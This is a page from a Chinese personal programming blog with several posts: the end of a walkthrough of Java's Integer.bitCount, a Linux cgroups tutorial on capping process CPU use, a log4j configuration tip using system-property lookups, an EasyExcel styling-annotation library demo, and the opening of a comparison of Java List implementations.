<p>在8位二进制数中，值为1的位数最大为8，仅需4个二进制位就能表示（PS：实际上，由<code>n &lt; 2 ^ (n / 2)</code>在<code>n &gt; 4</code>时均成立，可以得出：在n大于4时，n位二进制数的值为1的位数值m，只需不超过<code>n / 2</code>个二进制位即可表示）。这意味着相加后的结果值也不会超过4个二进制位，所以在计算中可以先不考虑高4位会对结果造成影响，清空高4位值的计算<code>&amp; 0x0f0f0f0f</code>可以在加法完成之后再进行，代码就可以简化成如下所示代码（比原来的代码少了一个指令）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br></pre></td></tr></table></figure>

<p><strong>4. 方法第四行</strong></p>
<p>与前面一样，每8位视为一个单独的数字数字，相加之后得到2个16位二进制数值。计算过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000100    00000110     00000011    00000011</span><br><span class="line">                      ⇩</span><br><span class="line">0000000000000100         0000000000000011</span><br><span class="line">                      +</span><br><span class="line">0000000000000110         0000000000000011</span><br><span class="line">                      ⇩</span><br><span class="line">0000000000001010         0000000000000110</span><br></pre></td></tr></table></figure>

<p>代码表示如下（0x00ff00ff的二进制值是0b_00000000111111110000000011111111)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i &amp; 0x00ff00ff) + ((i &gt;&gt;&gt; 8) &amp; 0x00ff00ff);</span><br></pre></td></tr></table></figure>

<p>同理于第3步，加法计算中也可以先不用担心高8位对结果造成的影响直接计算即可，代码优化为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i + (i &gt;&gt;&gt; 8)) &amp; 0x00ff00ff;</span><br></pre></td></tr></table></figure>

<p>此外，<strong>对于32位的<code>Integer</code>，值为1的位数最大为32，也就是说最终结果仅需6个二进制位即可表示</strong>。而当前每个加数都已经达到8个二进制位，这种情况下，相加后的和的高8位的值即使不清空也不会影响最终结果的低6位的值。所以，可以<strong>将高位清空的任务留到所有计算完成后一并处理</strong>，省略<code>&amp; 0x00ff00ff</code>后代码简化为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = i + (i &gt;&gt;&gt; 8);</span><br></pre></td></tr></table></figure>

<p>而省略<code>&amp; 0x00ff00ff</code>后实际的计算过程是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000100    00000110     00000011    00000011</span><br><span class="line">                      ⇩</span><br><span class="line">0000000000000100         0000011000000011</span><br><span class="line">                      +</span><br><span class="line">0000010000000110         0000001100000011</span><br><span class="line">                      ⇩</span><br><span class="line">0000010000001010         0000100100000110</span><br></pre></td></tr></table></figure>

<p><strong>5. 方法第五行</strong></p>
<p>同理于第4步，计算过程如下（以第4步中理论结果值为例）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000001010         0000000000000110</span><br><span class="line">                    ⇩</span><br><span class="line">00000000000000000000000000001010</span><br><span class="line">                    +</span><br><span class="line">00000000000000000000000000000110</span><br><span class="line">                    ⇩</span><br><span class="line">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>

<p>代码表示如下（0x0000ffff的二进制值是0b_00000000000000001111111111111111)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i &amp; 0x0000ffff) + ((i &gt;&gt;&gt; 16) &amp; 0x0000ffff);</span><br></pre></td></tr></table></figure>

<p>同理于第4步的优化，优化后代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = i + (i &gt;&gt;&gt; 16);</span><br></pre></td></tr></table></figure>

<p>同第4步一样的，贴出实际的计算过程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000010000001010         0000100100000110</span><br><span class="line">                    ⇩</span><br><span class="line">00000100000010100000100100000110</span><br><span class="line">                    +</span><br><span class="line">00000000000000000000010000001010</span><br><span class="line">                    ⇩</span><br><span class="line">00000100000010100000110100010000</span><br></pre></td></tr></table></figure>

<p><strong>6. 方法第六行</strong></p>
<p>前面第4步说过，为了精简代码的指令，将高位清空的任务留到所有计算完成后一并处理。在第4步和第5步中均遗留了未处理的高位数据，所以第6步将完成前面未完成的高位清空工作。第4步中已经分析过了，最终结果仅需6个二进制位即可表示，所以最后清空高26位的数据，计算过程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000100000010100000110100010000</span><br><span class="line">                ⇩</span><br><span class="line">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>

<p>代码表示如下（0x0000003f的二进制值是0b_00000000000000000000000000111111）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = i &amp; 0x0000003f;</span><br></pre></td></tr></table></figure>

<p>所以最终的结果是<code>0b_10000</code>即16</p>
<p>可以看出来，<code>Integer.bitCount</code>方法在代码所耗费的指令上已经作了极尽的优化。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/12/11/source-bitcount/" data-id="ck5qhi074002mg0uk0fz82vy1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-cgroup-cpu" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/25/linux-cgroup-cpu/" class="article-date">
  <time datetime="2019-11-25T11:20:11.000Z" itemprop="datePublished">2019-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/25/linux-cgroup-cpu/">Linux限制进程CPU上限</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>要实现linux限制进程上限的功能，需要用到Cgroups技术，它的全程Linux Control Group，用于限制一个进程组能够使用的资源（CPU、内存、磁盘、网络带宽）上限，还能够对进程进行优先级设置，以及进行将进程挂起恢复的操作。</p>
<p>Cgroups给用户暴露出来的操作接口是文件系统，以目录和文件的方式组织在<code>/sys/fs/cgroup</code>路径下。</p>
<p>执行<code>ls /sys/fs/cgroup</code>命令可以看到如下文件列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:$ ls /sys/fs/cgroup</span><br><span class="line">blkio  cpuacct      cpuset   freezer  memory   net_cls,net_prio  perf_event  rdma     unified</span><br><span class="line">cpu    cpu,cpuacct  devices  hugetlb  net_cls  net_prio          pids        systemd</span><br></pre></td></tr></table></figure>

<p>代表了可操作的各种资源</p>
<p>以cpu资源为例，查看<code>cpu</code>目录，执行<code>ls /sys/fs/cgroup/cpu</code>可以看到如下列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:$ ls /sys/fs/cgroup/cpu</span><br><span class="line">cgroup.clone_children  cpuacct.usage_all          cpuacct.usage_user  notify_on_release  user.slice</span><br><span class="line">cgroup.procs           cpuacct.usage_percpu       cpu.cfs_period_us   release_agent</span><br><span class="line">cgroup.sane_behavior   cpuacct.usage_percpu_sys   cpu.cfs_quota_us    system.slice</span><br><span class="line">cpuacct.stat           cpuacct.usage_percpu_user  cpu.shares          tasks</span><br><span class="line">cpuacct.usage          cpuacct.usage_sys          cpu.stat</span><br></pre></td></tr></table></figure>

<p>其中<code>tasks</code>文件列出了受限制的进程pid列表，<code>cpu.cfs_period_us</code>和<code>cpu.cfs_quota_us</code>文件搭配使用可以达到限制cpu使用率的目的，打开两个文件分别看到内容如下</p>
<p><code>cpu.cfs_period_us</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100000</span><br></pre></td></tr></table></figure>

<p><code>cpu.cfs_quota_us</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br></pre></td></tr></table></figure>

<p>表示100000us时间内不限制分配的cpu时间长度（-1表示不限制，如果将-1换成30000则表示允许分配30000us即30ms的cpu时间）</p>
<h2 id="实践一下"><a href="#实践一下" class="headerlink" title="实践一下"></a>实践一下</h2><p>cgroup是树型结构的，可以在当前树下新建子节点，根目录<code>/sys/fs/cgroup/cpu</code>一般表示整个计算机。所以我们不是直接操作<code>/sys/fs/cgroup/cpu</code>下面的文件，而是在目录树下创建一个名为<code>test</code>的子目录，查看目录可以发现操作系统会在新建的<code>test</code>目录下自动生成了该系统对应的资源限制文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:$ cd /sys/fs/cgroup/cpu</span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu$ mkdir test</span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu$ cd test</span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu$ </span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ ls</span><br><span class="line">cgroup.clone_children  cpuacct.usage         cpuacct.usage_percpu_sys   cpuacct.usage_user  cpu.shares         tasks</span><br><span class="line">cgroup.procs           cpuacct.usage_all     cpuacct.usage_percpu_user  cpu.cfs_period_us   cpu.stat</span><br><span class="line">cpuacct.stat           cpuacct.usage_percpu  cpuacct.usage_sys          cpu.cfs_quota_us    notify_on_release</span><br></pre></td></tr></table></figure>

<p>接下来，先启动两个用于测试的死循环进程，进程号分别为15007和15952</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class="line">[1] 15007</span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class="line">[2] 15952</span><br></pre></td></tr></table></figure>

<p>查看此时的cpu使用情况，cpu使用率达到了93.8%</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class="line">15952 root      20   0   22776   2960   1212 R 50.0  0.1  18:18.90 bash</span><br><span class="line">15007 root      20   0   22776   1684      0 R 43.8  0.1  24:04.92 bash</span><br></pre></td></tr></table></figure>

<p>修改<code>cpu.cfs_quota_us</code>文件和<code>tasks</code>文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;40000&quot; &gt; cpu.cfs_quota_us</span><br><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;15007\n15952&quot; &gt; tasks</span><br></pre></td></tr></table></figure>

<p>查看此时的cpu使用情况，发现cpu使用率成功降下来了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class="line">15952 root      20   0   22776   2960   1212 R 20.3  0.1  20:04.56 bash</span><br><span class="line">15007 root      20   0   22776   1684      0 R 19.9  0.1  25:50.57 bash</span><br></pre></td></tr></table></figure>

<h3 id="添加限制的进程"><a href="#添加限制的进程" class="headerlink" title="添加限制的进程"></a>添加限制的进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;1234&quot; &gt; tasks</span><br></pre></td></tr></table></figure>

<p>虽然上面写文件使用的符号是单大于号<code>&gt;</code>，但实际上并不会覆盖原本文件，实际效果是添加一个pid为1234的进程到该cgroup组中</p>
<h3 id="移除进程限制"><a href="#移除进程限制" class="headerlink" title="移除进程限制"></a>移除进程限制</h3><p>在cgroup数中，一个进程必须属于一个cgroup，所以不能从一个cgroup凭空删除一个进程，只能将进程移动到其他cgroup节点，所以删除操作也便成为了将进程移动到cgroup树的根节点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;15007&quot; &gt; ../tasks</span><br></pre></td></tr></table></figure>

<h3 id="删除cgroup组"><a href="#删除cgroup组" class="headerlink" title="删除cgroup组"></a>删除cgroup组</h3><p>删除cgroup文件夹即可，但这里使用<code>rm -rf test</code>是行不通的，需要使用<code>rmdir</code>命令。（删除时需确保cgroup组中没有进程存在）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/sys/fs/cgroup/cpu$ rmdir test</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/11/25/linux-cgroup-cpu/" data-id="ck5qhi06k001sg0uk2hoxyv2u" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-log4j" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/15/log4j/" class="article-date">
  <time datetime="2019-08-15T14:36:07.000Z" itemprop="datePublished">2019-08-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/15/log4j/">log4j xml配置文件个人配置如何不污染GIT远程仓库</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在spring中通常使用xml方式配置log4j。通常开发人员根据自身习惯会在本地开发环境设置令自己舒适的日志打印级别，然而在团队合作编程中，常因配置文件误提交导致污染GIT远程仓库。</p>
<p>针对这个问题，这里分享一个小经验——借助命令行参数在不改变文件的情况下，使配置更加的舒适</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol>
<li><p>首先修改xml配置文件的参数为<code>${}</code>形式，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;logger name=&quot;com.xxx.dao&quot; level=&quot;$&#123;sys:log4j.level.dao:-WARN&#125;&quot; additivity=&quot;false&quot;&gt;</span><br><span class="line">    &lt;appender-ref ref=&quot;CONSOLE&quot;/&gt;</span><br><span class="line">&lt;/logger&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行命令添加参数值设置自己的习惯级别，IDEA为例在<code>VM options</code>后补加一个变量<code>log4j.level.dao</code>的参数设定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dlog4j.level.dao=debug</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>此时，使用配置了该参数的启动项启动日志级别即为debug级别</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>实际上，添加VM options参数的方式，不止适用于这里，同样适用于覆盖已有的properties文件、yml文件的配置，只是log4j比较特殊，这里特意写篇博客单独记述。<br>在log4j中，<code>${}</code>的使用方式与其他地方有所不同</p>
<ol>
<li>log4j中的<code>${}</code>并不能识别项目的properties文件的内容</li>
<li>log4j中的<code>${}</code>属性引用格式与其他地方不同，下面具体解释</li>
</ol>
<p>在log4j中，<code>${}</code>参数<code>sys:log4j.level.dao:-WARN</code>中，<code>sys</code>表示使用<code>SystemPropertiesLookup</code>转化参数，<code>:</code>和<code>:-</code>之间表示属性名，<code>:-</code>之后表示默认值。<code>Lookup</code>的类型可在<code>org.apache.logging.log4j.core.lookup.Interpolator#Interpolator(java.util.Map&lt;java.lang.String,java.lang.String&gt;)</code>中看到，有多个不同的lookup。</p>
<p>去官网转了一圈，也有看到lookup使用的相关介绍<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup" target="_blank" rel="noopener">链接</a>，但说实话，没看过源码的话可能不是很好理解，所以最好还是稍微阅读一下源码</p>
<p>题外话，看了log4j部分源码，实际上log4j获取默认配置文件地址的源码位于<code>org.apache.logging.log4j.core.config.ConfigurationFactory.Factory#getConfiguration(boolean, java.lang.String)</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/08/15/log4j/" data-id="ck5qhi06i001qg0uk62ih4sof" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j/">log4j</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-common-excel" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/31/common-excel/" class="article-date">
  <time datetime="2019-07-31T14:36:06.000Z" itemprop="datePublished">2019-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/31/common-excel/">阿里Easy Excel自定义样式注解</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>现在是第一版common-excel，基于<code>alibaba/easyexcel</code>依赖进行样式扩展封装而来的，增加了一些样式注解</p>
<h2 id="可以解决什么问题"><a href="#可以解决什么问题" class="headerlink" title="可以解决什么问题"></a>可以解决什么问题</h2><ol>
<li>注解式样式</li>
<li>代码方式自定义样式</li>
<li>冻结行列样式</li>
<li>合并单元格样式</li>
<li>设置内容下拉框</li>
<li>背景颜色</li>
<li>字体设置</li>
<li>列宽度设置</li>
<li>边框样式</li>
<li>居中方式</li>
<li>是否换行</li>
</ol>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="../static/MB19073101-1.png" alt="img - 1"> </p>
<p><img src="../static/MB19073101-2.png" alt="img - 2"> </p>
<h2 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h2><p>model代码示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@CellFreeze(freezeRow = 2, freezeCol = 2)</span><br><span class="line">// 宽度默认值</span><br><span class="line">@ColumnWidth(width = 40)</span><br><span class="line">// 同时作用于表标题和内容的样式默认值</span><br><span class="line">@CellStyle(fontStyle = @FontStyle(color = IndexedColors.LIGHT_BLUE, size = 14))</span><br><span class="line">public class MyModel1 extends BaseRowModel &#123;</span><br><span class="line"></span><br><span class="line">    // easyexcel 解析注解</span><br><span class="line">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr1&quot;&#125;, index = 0)</span><br><span class="line">    private String pr1;</span><br><span class="line"></span><br><span class="line">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr2&quot;&#125;, index = 1)</span><br><span class="line">    private String pr2;</span><br><span class="line"></span><br><span class="line">    @ExcelProperty(value = &#123;&quot;propValue1&quot;&#125;, index = 2)</span><br><span class="line">    // 数组方式指定的下拉框约束</span><br><span class="line">    @ExplicitConstraint(source = &#123;&quot;aaa1&quot;, &quot;aaa2&quot;, &quot;aaa3&quot;&#125;)</span><br><span class="line">    @ColumnWidth(width = 100)</span><br><span class="line">    private String propValue1;</span><br><span class="line"></span><br><span class="line">    @ExcelProperty(value = &#123;&quot;propValue2&quot;&#125;, index = 3)</span><br><span class="line">    @ExplicitConstraint(enumSource = MyConstraintEnum.class)</span><br><span class="line">    private String propValue2;</span><br><span class="line"></span><br><span class="line">    @ExcelProperty(value = &#123;&quot;score&quot;&#125;, index = 4)</span><br><span class="line">    @ColumnWidth(width = 50)</span><br><span class="line">    private Integer score;</span><br><span class="line"></span><br><span class="line">    @ExcelProperty(value = &#123;&quot;date&quot;&#125;, index = 5, format = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br><span class="line">    private Date date;</span><br><span class="line"></span><br><span class="line">    public String getPr1() &#123;</span><br><span class="line">        return pr1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPr1(String pr1) &#123;</span><br><span class="line">        this.pr1 = pr1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPr2() &#123;</span><br><span class="line">        return pr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPr2(String pr2) &#123;</span><br><span class="line">        this.pr2 = pr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPropValue1() &#123;</span><br><span class="line">        return propValue1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPropValue1(String propValue1) &#123;</span><br><span class="line">        this.propValue1 = propValue1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPropValue2() &#123;</span><br><span class="line">        return propValue2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPropValue2(String propValue2) &#123;</span><br><span class="line">        this.propValue2 = propValue2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Integer getScore() &#123;</span><br><span class="line">        return score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setScore(Integer score) &#123;</span><br><span class="line">        this.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Date getDate() &#123;</span><br><span class="line">        return date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setDate(Date date) &#123;</span><br><span class="line">        this.date = date;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>详细代码戳下方链接<br><a href="https://github.com/Uetty/common-excel" target="_blank" rel="noopener">仓库主页</a></p>
<p><a href="https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/withhead/TestWithHeadModel.java" target="_blank" rel="noopener">有标题头demo</a></p>
<p><a href="https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel1.java" target="_blank" rel="noopener">无标题头demo1</a></p>
<p><a href="https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel2.java" target="_blank" rel="noopener">无标题头demo2</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/07/31/common-excel/" data-id="ck5qhi06h001ng0ukbiu3xjs0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/open-source/">open source</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-compare-list-vertor-cowlist" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/compare-list-vertor-cowlist/" class="article-date">
  <time datetime="2019-07-29T11:33:16.000Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/compare-list-vertor-cowlist/">ArrayList、Vector、CopyOnWriteArrayList对比</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>ArrayList、Vector、CopyOnWriteArrayList均是实现了List接口的容器，他们之间究竟有何区别？为何JDK要同时提供这三种List？本文针对这个问题，进行深入的探究。</p>
<h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><h3 id="1-研究一个类源码，首先了解它有哪些成员变量"><a href="#1-研究一个类源码，首先了解它有哪些成员变量" class="headerlink" title="1. 研究一个类源码，首先了解它有哪些成员变量"></a>1. 研究一个类源码，首先了解它有哪些成员变量</h3><p>查看ArrayList源码，可以很清除的看到，ArrayList最主要的成员变量就两个，变量的作用很明显，存储对象数组和记录数组内存储的变量个数，ArrayList内元素是以Array方式存储的，所以叫做ArrayList</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* The array buffer into which the elements of the ArrayList are stored.</span><br><span class="line">* The capacity of the ArrayList is the length of this array buffer. Any</span><br><span class="line">* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><br><span class="line">* will be expanded to DEFAULT_CAPACITY when the first element is added.</span><br><span class="line">*/</span><br><span class="line">transient Object[] elementData; // non-private to simplify nested class access</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* The size of the ArrayList (the number of elements it contains).</span><br><span class="line">*</span><br><span class="line">* @serial</span><br><span class="line">*/</span><br><span class="line">private int size;</span><br></pre></td></tr></table></figure>

<h3 id="2-针对特征功能的探究"><a href="#2-针对特征功能的探究" class="headerlink" title="2. 针对特征功能的探究"></a>2. 针对特征功能的探究</h3><p>ArrayList之所以是一个List，而不是Array，就在于ArrayList长度可以扩展，这里探究它在add元素时是如何进行扩容的。</p>
<p>查看add代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* Appends the specified element to the end of this list.</span><br><span class="line">*</span><br><span class="line">* @param e element to be appended to this list</span><br><span class="line">* @return &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;@link Collection#add&#125;)</span><br><span class="line">*/</span><br><span class="line">public boolean add(E e) &#123;</span><br><span class="line">    ensureCapacityInternal(size + 1);  // Increments modCount!!</span><br><span class="line">    elementData[size++] = e;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

